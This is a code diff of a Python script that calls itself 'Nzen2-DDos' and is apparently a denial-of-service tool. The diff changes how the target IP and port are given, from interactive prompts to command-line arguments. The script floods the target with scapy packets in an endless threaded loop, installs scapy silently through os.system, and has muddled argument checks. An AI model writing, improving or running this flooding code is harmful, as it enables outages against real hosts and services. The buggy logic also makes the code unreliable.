@@ -9,7 +9,7 @@ from os import listdir
 os.system('pip3 install scapy')
 from scapy.all import *
 import threading
-version = 'v Alpha 0.4'
+version = 'v Alpha 0.5'
 def get_ip_address():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.connect(("8.8.8.8", 80))
@@ -59,47 +59,16 @@ logoascii = '''
              '''
 
 
-# Function for Main Screen, (mainscr) for easy access.
-def mainscr():
-
-    os.system("cls")
-    print(title)
-
-    os.system("pause")
-mainscr()
-os.system("cls")
-sc2 = '''
-    Enter the destination IP Address:
-    then,
-    Enter the port:
-
-    ex: xxx.xxx.x.x (Enter)
-    xx (Enter)
 
 
-      (Localhost is the Local IP)
-      (Port 80 is the most common ICP, HTTP. )
-
-       '''
-# Function for Second Screen, (secondscr) for easy access.
-def secondscr():
-    os.system('cls')
-
-    print(sc2)
-
-    print(logoascii)
-
-print(secondscr())
-
-target_ip = input("IP:")
-target_port = input("Port:")
-
-
-destip = target_ip
-destport = target_port
-
-
+#command line arguments
 packets_sent = 0
+
+
+sys.argv.append('-s')
+variable = sys.argv[1]
+target_ip = sys.argv[2]
+target_port = sys.argv[3]
 
 def attack():
     while True:
@@ -107,27 +76,22 @@ def attack():
         send(p , verbose=1, loop=0)
         global packets_sent
         packets_sent += 1
-        
-        print(infoui)
+        print("Nzen2-DDos")
+        print("{} Packets sent from {} to {}:{} ".format(packets_sent, get_ip_address(), target_ip, target_port))
+        os.system('cls')
 
-#infoui
-atk_thread = threading.Thread(target=attack)
-atk_thread.start()
+atk_thread = threading.Thread(target=attack)        
 
-print('\n')
-print('[*] Attack started')
-print('')
-print('[*] Target IP: ' + target_ip)
-print('[*] Target Port: ' + target_port)
-print('')
-print('[*] Packets sent: ' + str(packets_sent))
-print('[*] Press CTRL + C to stop the attack')
-print('')
-print('[*] Press any key to continue')
+if variable == '-s':
+    atk_thread.start()
 
-input()
 
-    
+if len(sys.argv) != 3:
+    print("-h:")
+    print("\nUsage:\nddos.py -<variable> <target_ip> <target_port>\n")
+
+
+
 
 
 input("Press Enter to exit:")
